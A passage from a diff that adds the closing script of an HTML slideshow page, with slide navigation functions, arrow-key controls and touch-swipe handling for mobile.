+            document.getElementById('current-slide').textContent = currentSlide + 1;
+        }
+
+        function nextSlide() {
+            showSlide(currentSlide + 1);
+        }
+
+        function previousSlide() {
+            showSlide(currentSlide - 1);
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowRight') nextSlide();
+            if (e.key === 'ArrowLeft') previousSlide();
+        });
+
+        // Touch/swipe support for mobile
+        let touchStartX = 0;
+        let touchEndX = 0;
+
+        document.addEventListener('touchstart', function(e) {
+            touchStartX = e.changedTouches[0].screenX;
+        });
+
+        document.addEventListener('touchend', function(e) {
+            touchEndX = e.changedTouches[0].screenX;
+            handleSwipe();
+        });
+
+        function handleSwipe() {
+            if (touchEndX < touchStartX - 50) nextSlide();
+            if (touchEndX > touchStartX + 50) previousSlide();
+        }
+    </script>
+</body>
+</html>
